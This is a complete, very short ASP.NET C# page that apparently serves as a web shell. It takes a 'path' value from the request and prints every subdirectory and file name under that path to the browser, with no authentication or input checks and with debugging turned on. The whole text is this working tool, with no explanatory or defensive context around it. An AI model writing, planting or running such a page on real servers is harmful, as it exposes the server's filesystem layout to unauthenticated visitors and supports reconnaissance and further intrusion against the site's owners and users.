<%@ Page Language="c#" Debug=true%>
<%
string path=Request["path"];
string[] fileArray = System.IO.Directory.GetFiles(path);
string[] patharr= System.IO.Directory.GetDirectories(path);
for(int i=0;i<patharr.Length;i++){
Response.Write(patharr[i]+"\n");
}

for(int i=0;i<fileArray.Length;i++){
Response.Write(fileArray[i]+"\n");
}

%>
